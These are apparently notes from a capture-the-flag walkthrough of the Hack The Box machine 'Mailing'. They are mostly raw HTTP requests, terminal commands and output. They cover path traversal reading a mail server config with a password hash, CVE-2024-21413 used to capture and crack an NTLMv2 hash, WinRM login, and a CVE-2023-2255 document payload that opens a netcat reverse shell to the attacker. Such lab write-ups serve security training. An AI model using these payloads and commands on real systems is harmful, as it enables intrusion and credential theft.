@@ -1,0 +1,278 @@
+
+
+
+
+GET /download.php?file=instructions.pdf HTTP/1.1
+Host: mailing.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Referer: http://mailing.htb/
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+
+
+
+GET /download.php?file=..\..\..\..\windows/win.ini HTTP/1.1
+Host: mailing.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Referer: http://mailing.htb/
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+
+HTTP/1.1 200 OK
+Cache-Control: must-revalidate
+Pragma: public
+Content-Type: application/octet-stream
+Expires: 0
+Server: Microsoft-IIS/10.0
+X-Powered-By: PHP/8.3.3
+Content-Description: File Transfer
+Content-Disposition: attachment; filename="win.ini"
+X-Powered-By: ASP.NET
+Date: Tue, 18 Nov 2025 02:41:48 GMT
+Content-Length: 92
+
+; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
+
+
+
+"Since the server uses hMailServer , we can perform a Google search to locate the configuration
+file. This search reveals that the configuration file is located at C:\Program Files
+(x86)\hMailServer\Bin\hMailServer.ini . Let's try to read this file using the following URL-
+encoded payload."
+
+
+GET /download.php?file=..\..\..\..\Program+Files+(x86)/hMailServer/Bin/hMailServer.ini HTTP/1.1
+Host: mailing.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Referer: http://mailing.htb/
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+HTTP/1.1 200 OK
+Cache-Control: must-revalidate
+Pragma: public
+Content-Type: application/octet-stream
+Expires: 0
+Server: Microsoft-IIS/10.0
+X-Powered-By: PHP/8.3.3
+Content-Description: File Transfer
+Content-Disposition: attachment; filename="hMailServer.ini"
+X-Powered-By: ASP.NET
+Date: Tue, 18 Nov 2025 02:43:01 GMT
+Content-Length: 604
+
+[Directories]
+ProgramFolder=C:\Program Files (x86)\hMailServer
+DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
+DataFolder=C:\Program Files (x86)\hMailServer\Data
+LogFolder=C:\Program Files (x86)\hMailServer\Logs
+TempFolder=C:\Program Files (x86)\hMailServer\Temp
+EventFolder=C:\Program Files (x86)\hMailServer\Events
+[GUILanguages]
+ValidLanguages=english,swedish
+[Security]
+AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
+[Database]
+Type=MSSQLCE
+Username=
+Password=0a9f8ad8bf896b501dde74f08efd7e4c
+PasswordEncryption=1
+Port=0
+Server=
+Database=hMailServer
+Internal=1
+
+
+
+password is cracked to
+homenetworkingadministrator
+
+"Since the remote Windows server is running a mail server, it is also likely using a mail client to
+connect to it. The default mail client for Windows is Windows Mail. With this information, a Google
+search for recent vulnerabilities related to Windows Mail leads us to this GitHub repository, which
+includes a proof of concept (PoC) for CVE-2024-21413. Named the Moniker Link bug, the root
+cause of this vulnerability lies in how Windows Mail interprets certain hypertext links, particularly
+those utilizing COM Monikers technology. Suppose a link directs to an SMB share, formatted as \\
+<Malicious_IP>\file , in that case, the Windows Mail will automatically attempt to authenticate
+with the malicious remote server using the NTLM hash of the current user, which the remote
+server can then capture for malicious purposes."
+https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
+
+
+"We need to identify the recipient of the email who will open our malicious message and trigger the
+payload. From the webpage, we know there are three team members. We should attempt to email
+each user individually, starting with Maya Bendito who is a part of the Support Team "
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password 'homenetworkingadministrator' --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\10.10.14.49\smbFolder\test.txt" --subject Test 
+
+CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
+Alexander Hagenah / @xaitax / ah@primepage.de
+
+✅ Email sent successfully.
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-smbserver smbFolder $(pwd) -smb2support
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.11.14,59697)
+[*] AUTHENTICATE_MESSAGE (MAILING\maya,MAILING)
+[*] User MAILING\maya authenticated successfully
+[*] maya::MAILING:aaaaaaaaaaaaaaaa:ae7db9460f8437ed403a8fbb3ddd5bd6:010100000000000080b4d67c3c58dc0154c80be79900a21c00000000010010005700470058006b007700410046004200030010005700470058006b007700410046004200020010005200430041007300490043006f005100040010005200430041007300490043006f0051000700080080b4d67c3c58dc0106000400020000000800300030000000000000000000000000200000db108273a6f271d74f4ff9d189e6b165deb75bd993c54b020e4ab0b523a51e400a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340039000000000000000000
+[*] Connecting Share(1:IPC$)
+[*] Connecting Share(2:smbFolder)
+[*] NetrGetShareInfo Level: 1
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# echo 'maya::MAILING:aaaaaaaaaaaaaaaa:ae7db9460f8437ed403a8fbb3ddd5bd6:010100000000000080b4d67c3c58dc0154c80be79900a21c00000000010010005700470058006b007700410046004200030010005700470058006b007700410046004200020010005200430041007300490043006f005100040010005200430041007300490043006f0051000700080080b4d67c3c58dc0106000400020000000800300030000000000000000000000000200000db108273a6f271d74f4ff9d189e6b165deb75bd993c54b020e4ab0b523a51e400a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340039000000000000000000' >hash
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+m4y4ngs4ri       (maya)     
+1g 0:00:00:02 DONE (2025-11-17 22:37) 0.4672g/s 2772Kp/s 2772Kc/s 2772KC/s m61405..m4895621
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# evil-winrm -u maya -p m4y4ngs4ri -i mailing.htb
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\maya\Documents> 
+
+we find that libreoffice is on the system
+
+
+*Evil-WinRM* PS C:\Program Files> ls
+
+
+    Directory: C:\Program Files
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         2/27/2024   5:30 PM                Common Files
+d-----          3/3/2024   4:40 PM                dotnet
+d-----          3/3/2024   4:32 PM                Git
+d-----         4/29/2024   6:54 PM                Internet Explorer
+d-----          3/4/2024   6:57 PM                LibreOffice
+d-----          3/3/2024   4:06 PM                Microsoft Update Health Tools
+d-----         12/7/2019  10:14 AM                ModifiableWindowsApps
+d-----         2/27/2024   4:58 PM                MSBuild
+d-----         2/27/2024   5:30 PM                OpenSSL-Win64
+d-----         3/13/2024   4:49 PM                PackageManagement
+d-----         2/27/2024   4:58 PM                Reference Assemblies
+d-----         3/13/2024   4:48 PM                RUXIM
+d-----         2/27/2024   4:32 PM                VMware
+d-----          3/3/2024   5:13 PM                Windows Defender
+d-----         4/29/2024   6:54 PM                Windows Defender Advanced Threat Protection
+d-----          3/3/2024   5:13 PM                Windows Mail
+d-----          3/3/2024   5:13 PM                Windows Media Player
+d-----         4/29/2024   6:54 PM                Windows Multimedia Platform
+d-----         2/27/2024   4:26 PM                Windows NT
+d-----          3/3/2024   5:13 PM                Windows Photo Viewer
+d-----         4/29/2024   6:54 PM                Windows Portable Devices
+d-----         12/7/2019  10:31 AM                Windows Security
+d-----         3/13/2024   4:49 PM                WindowsPowerShell
+
+
+*Evil-WinRM* PS C:\Program Files> type "C:\program files\libreoffice\program\version.ini"
+[Version]
+...
+MsiProductVersion=7.4.0.1
+...
+*Evil-WinRM* PS C:\Program Files> 
+
+
+"With the version information for LibreOffice, we can search for any related exploits and discover
+that this version is vulnerable to CVE-2023-2255. This vulnerability involves improper access
+control in LibreOffice's editor components, allowing an attacker to create a document that loads
+external links without prompting the user. We can assume that a system user is opening files with
+LibreOffice. To exploit this, we could upload a malicious file to the system and wait for the user to
+open it, triggering our payload. A PoC for generating the malicious payload can be found here.
+Let's clone this GitHub repository to our local system."
+
+https://github.com/elweth-sec/CVE-2023-2255/tree/main
+
+
+
+*Evil-WinRM* PS C:\Programdata> upload nc64.exe
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 2255.py --cmd "cmd.exe /c C:\ProgramData\nc.exe -e cmd.exe 10.10.14.49 9001" --output exploit.odt
+File exploit.odt has been created !
+                                                                                                                     
+
+*Evil-WinRM* PS C:\> cd "Important Documents"
+*Evil-WinRM* PS C:\Important Documents> upload exploit.odt
+                                        
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.49] from (UNKNOWN) [10.10.11.14] 51894
+Microsoft Windows [Version 10.0.19045.4355]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Program Files\LibreOffice\program>whoami
+whoami
+mailing\localadmin
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
